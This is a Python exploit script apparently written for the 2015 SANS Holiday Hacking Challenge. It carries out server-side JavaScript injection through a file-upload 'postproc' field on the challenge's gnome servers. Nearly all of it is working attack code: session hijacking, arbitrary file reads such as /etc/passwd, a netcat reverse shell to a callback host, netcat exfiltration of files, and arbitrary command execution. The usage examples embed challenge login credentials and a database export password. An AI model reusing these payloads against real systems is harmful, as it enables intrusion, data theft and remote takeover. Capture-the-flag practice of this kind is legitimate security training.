#!/usr/bin/python
#
# Exploit Title: SANS Holiday Hacking Challenge GIYH SG04 and SG01 SSJS Exploit
# Date: 12/2015
# Exploit Author: @deckerXL
# Version: 1.1
# Tested on: sg04 and sg01
# Description: This will perform an SSJS injection attack on the Files upload "postproc" parameter achieving arbitrary file download and remote code execution
#              This attack works SG04 using the admin login and also on SG01 using the stuart login gathered from the any of the other SG mongod.log files

import sys
import json
import httplib
import urllib
import urllib2
import itertools
import mimetools
import mimetypes
from cStringIO import StringIO

# There's a problem with urllib2 and incomplete read requests - these two lines help but limit you to 65535 bytes
#httplib.HTTPConnection._http_vsn = 10			
#httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

debug           = False
pathstartmarker = '<p class="message">Dir '
pathendmarker   = ' created successfully!'

# =============================================================
# Class needed to overload the HTTPRedirectHandler so 
# sessionid can be captured prior to redirect
# =============================================================
class NoRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        infourl.code = code
        return infourl
    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302

opener = urllib2.build_opener(NoRedirectHandler())
urllib2.install_opener(opener)

# =============================================================
# Class needed to handle multi-part POST used by 
# the Files Upload feature
# =============================================================
class MultiPartForm(object):
    """Accumulate the data to be used when posting a form."""

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = '---------------------------'+mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        """Add a simple field to the form data."""
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        """Add a file to be uploaded."""
	body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):
        """Return a string representing the form data, including attached files."""
        # Build a list of lists, each containing "lines" of the
        # request.  Each part is separated by a boundary string.
        # Once the list is built, return a string where each
        # line is separated by '\r\n'.  
        parts = []
        part_boundary = '--' + self.boundary
        
        # Add the form fields
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        # Add the files to upload
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        # Flatten the list and add closing boundary marker,
        # then return CR+LF separated data
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

# =============================================================
# Usage for sg04 and sg01 
# =============================================================
def usage():
	print "Usage:"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py <ip> <port> <user> <password> <command> [callbackip] [callbackport] [filename] [cmd] [-d]\n"
	print "<ip> = ip address of target"
	print "<port> = port of target"
	print "<user>     = User to login with"
	print "<password> = Password to login with"
	print "<command>"
	print "  D = Direct HTTP Download (Note: this has a filesize limitation of about 64k - use netcat download option for large files)"
	print "     <filename> = full path from / to the file you want to download"
	print "  S = Get a netcat reverse shell"
	print "     <callbackip> = ip address for reverse shell callback"
	print "     <callbackport> = port for reverse shell callback"
	print "  N = Netcat File Download - good for large files"
	print "     <callbackip> = ip address for reverse shell callback"
	print "     <callbackport> = port for reverse shell callback"
	print "     <filename> = full path from / to the file you want to download"
	print "  A = Execute arbitrary command"
	print "     <cmd> = command in single quotes to be executed"
	print ""
	print "sg04 Examples:"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf D /etc/passwd"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf D /gnome/www/files/gnome.conf"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf D /var/log/mongodb/mongod.log; grep -i username mongod.log"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf S 1.1.1.1 1337"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf N 1.1.1.1 1337 /gnome/www/files/gnome.conf"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf N 1.1.1.1 1337 /var/log/mongodb/mongod.log"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf N 1.1.1.1 1337 /gnome/www/files/20151203133815.zip"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf N 1.1.1.1 1337 /gnome/www/files/factory_cam_4.zip"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf A 'mongoexport --username gnome --password KTt9C1SljNKDiobKKro926frc --db gnome --collection users --out /tmp/sg04-users.json'"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.192.152.132 80 admin SittingOnAShelf D /tmp/sg04-users.json"
	print ""
	print "sg01 Examples: (note: revshell options 'N' and 'S' don't work from sg01, however you can use combo of bzip2 + split ('A' option) + straight http download 'D' option to get a >64k file "
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /etc/passwd"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /gnome/www/routes/index.js"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /gnome/www/files/gnome.conf"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy A 'cd /tmp; bzip2 -9 /tmp/bigfile.txt; split -b 64k /tmp/bigfile.txt.bz2 bf; ls -al /tmp > tmpls.txt'"
	print "     ./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /tmp/tmpls.txt"
	print "     ./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /tmp/bfaa"
	print "     ./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /tmp/bfab"
	print "     ..."
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy A 'mongoexport --username gnome --password KTt9C1SljNKDiobKKro926frc --db gnome --collection users --out /tmp/sg01-users.json'"
	print "./giyh-sg04-and-sg01-SSJS-pwn.py 52.2.229.189 80 stuart MyBossIsCrazy D /tmp/sg01-users.json"
	sys.exit(1)

# =============================================================
# Custom message handler 
# =============================================================
def pmsg( str, code ):
        if ( code == 0 ):
                print "        [*] "+str      # Status message
        elif ( code == 1):
                print "        [+] "+str      # Success message
        elif ( code == 2):
                print "        [-] "+str      # Error message
        else:
                pass

# =============================================================
# Banner 
# =============================================================
def banner():
        print ""
        print "       =[ ----------------------------------------------- ]"
        print "+ -- --=[ GIYH SG04 & SG01 SSJS Exploit                   ]"
        print "       =[                                     by deckerXL ]"
        print "       =[ ----------------------------------------------- ]"
        print "                                                    __     "
        print "                                                 .-'  |    "
        print "                                                /   <\|    "
        print "                                               /     \'    "
        print "                                               |_.- o-o    "
        print "                                               / C  -._)\  "
        print "          ________.________.___. ___ ___      /',        | "
        print "         /  _____/|   \__  |   |/   |   \    |   `-,_,__,' "
        print "        /   \  ___|   |/   |   /    ~    \   (,,)====[_]=| "
        print "        \    \_\  \   |\____   \    Y    /     '.   ____/  "
        print "         \______  /___|/ ______|\___|_  /       | -|-|_    "
        print "                \/     \/             \/        |____)_)   "
        print ""

# =============================================================
# Check input parameters
# =============================================================
if (len(sys.argv) < 7):
	usage()

ip = sys.argv[1][0:15]
try:
	port = int(sys.argv[2][0:5])
except:
	pmsg ("ERROR - Invalid Target Port: ["+sys.argv[2]+"]",2)
	usage()

user = sys.argv[3][0:25]
passw = sys.argv[4][0:50]
command = sys.argv[5][0:1]

banner()

if (command == "D"):
	if (len(sys.argv)>=7):
		file = sys.argv[6][0:100]
		file_download_command = "res.write(require('fs').readFileSync('"+file+"'))"
		pmsg ("Attempting straight http DOWNLOAD FILE operation using the following SSJS Injection command ["+file_download_command+"]...",1)
	else:
		pmsg ("ERROR - Filename missing",2)
		usage()

elif (command == "S"):
	if (len(sys.argv)>=8):
		callbackip = sys.argv[6][0:15]
		try:
			callbackport = int(sys.argv[7][0:5])
		except:
			pmsg ("ERROR - Invalid Callback Port: ["+sys.argv[7]+"]",2)
			usage()

		netcat_revshell_command = "require('child_process').exec('/bin/nc.traditional -e /bin/bash "+callbackip+" "+str(callbackport)+"')"
		pmsg ("Attempting a NETCAT REVERSE SHELL operation using the following SSJS Injection command ["+netcat_revshell_command+"]...",1)
	else:
		pmsg ("ERROR - Missing callback ip or callback port",2)
		usage()
	
elif (command == "N"):
	if (len(sys.argv)>=9):
		callbackip = sys.argv[6][0:15]
		try:
			callbackport = int(sys.argv[7][0:5])
		except:
			pmsg ("ERROR - Invalid Callback Port: ["+sys.argv[7]+"]",2)
			usage()

		file = sys.argv[8][0:100]
		netcat_file_download_command = "require('child_process').exec('/bin/nc "+callbackip+" "+str(callbackport)+" < "+file+"')"
		pmsg ("Attempting a NETCAT FILE DOWNLOAD operation using the following SSJS Injection command ["+netcat_file_download_command+"]...",1)
	else:
		pmsg ("ERROR - Missing callback ip, callback port, or filename",2)
		usage()
elif (command == "A"):
	if (len(sys.argv)>=7):
		cmd = sys.argv[6][0:100]
		arbitrary_cmd = "require('child_process').exec('"+cmd+"')"
		pmsg ("Attempting to run an ARBITRARY COMMAND using the following SSJS Injection command ["+arbitrary_cmd+"]...",1)
	else:
		pmsg ("ERROR - Command missing",2)
		usage()

else:
	pmsg ("ERROR - Invalid Command: ["+sys.argv[5]+"]",2)
	usage()

if ("-d" in sys.argv):
	debug = True

url = "http://"+ip+":"+str(port)+"/"

values = { 'username': user,'password': passw }
data = urllib.urlencode(values) 

# =============================================================
# Initial GET Request to get a valid sessionid
# =============================================================
pmsg ("Retrieving an initial valid sessionid from URL ["+url+"]...",0)
try:
        req_init = urllib2.Request(url)
        req_init.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
        res_init = urllib2.urlopen(req_init)
except:
        pmsg ("ERROR - Connecting to URL: ["+url+"]",2)
        sys.exit(1)

init_headers = res_init.info()
init_body = res_init.read()

if (debug):
        print "Init Headers & Body ------------------------------------------------------------"
        print init_headers
        print "--------------------------------------------------------------------------------"
        print "["+init_body+"]"
        print "--------------------------------------------------------------------------------"

sessionid = str(filter(lambda x: 'sessionid' in x, init_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got an initial valid sessionid: ["+sessionid+"]!",1)
res_init.close()

# =============================================================
# GET Admin sessionid
# =============================================================
req_admin = urllib2.Request(url)
req_admin.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_admin.add_header('Content-Type', 'application/x-www-form-urlencoded')
req_admin.add_header('Cookie', 'sessionid='+sessionid)
res_admin = urllib2.urlopen(req_admin, data)
admin_headers = res_admin.info()
admin_body = res_admin.read()

if (debug):
        print "Admin Headers & Body -----------------------------------------------------------"
        print admin_headers
        print "--------------------------------------------------------------------------------"
        print "["+admin_body+"]"
        print "--------------------------------------------------------------------------------"

admin_sessionid = str(filter(lambda x: 'sessionid' in x, admin_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got an ADMIN valid sessionid: ["+admin_sessionid+"]!",1)
res_admin.close()

# =============================================================
# Use File Upload to perform SSJS injection
# =============================================================
filesurl = url + "files"
pmsg ("Opening URL: ["+filesurl+"]",0)

form = MultiPartForm()
if (command == "D"):
	ssjs_command = file_download_command
elif (command == "S"):
	ssjs_command = netcat_revshell_command
elif (command == "N"):
	ssjs_command = netcat_file_download_command
elif (command == "A"):
	ssjs_command = arbitrary_cmd

form.add_field('postproc', ssjs_command)

# Add a fake file
form.add_file('file', 'doesnotmatter.png', fileHandle=StringIO('doesnotmatter'), mimetype='image/png')

# Build the request
req_files = urllib2.Request(filesurl)
req_files.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_files.add_header('Cookie', 'sessionid='+admin_sessionid)
body = str(form)
req_files.add_header('Content-type', form.get_content_type())
req_files.add_header('Content-length', len(body))
req_files.add_data(body)
try:
	res_files = urllib2.urlopen(req_files)
except:
	pmsg ("ERROR - An error occurred injecting the command. Double check your commmand parameters. If downloading a file, double check that you have the right path.",2)
	sys.exit(1)

files_headers = res_files.info()
files_body = ''
files_body_part = ''

# =============================================================
# Read in the file
# =============================================================
while True:
	try:
		files_body_part = res_files.read(69348)	# There's a problem with urllib2 reading and file download size limit of about 64k - not good for large files
		if (files_body_part == ''):
			break
	except httplib.IncompleteRead as e:
		files_body = files_body + e.partial
		continue
	else:
		files_body = files_body + files_body_part
		break

res_files.close()

if (debug):
        print "Files Headers & Body -----------------------------------------------------------"
        print files_headers
        print "--------------------------------------------------------------------------------"
        print "["+files_body+"]"
        print "--------------------------------------------------------------------------------"

if (command == "D"):
	# =============================================================
	# Write each file
	# =============================================================
	writefile = file.split('/')[-1]
	pmsg ("Saving ["+writefile+"]...",1)
	f = open(writefile, 'w')
	f.write(files_body)
	f.close()
elif (command == "S"):
	pmsg ("Netcat reverse shell command sent... Check your netcat listener. Should be run like this: nc -lvnp "+str(callbackport),0)
elif (command == "N"):
	writefile = file.split('/')[-1]
	pmsg ("Netcat file download command sent... Check your netcat listener. Should be run like this: nc -lvnp "+str(callbackport)+" > "+writefile,0)
elif (command == "A"):
	pmsg ("Arbitrary command sent...",0)

pmsg ("Done!",0)
sys.exit(0)
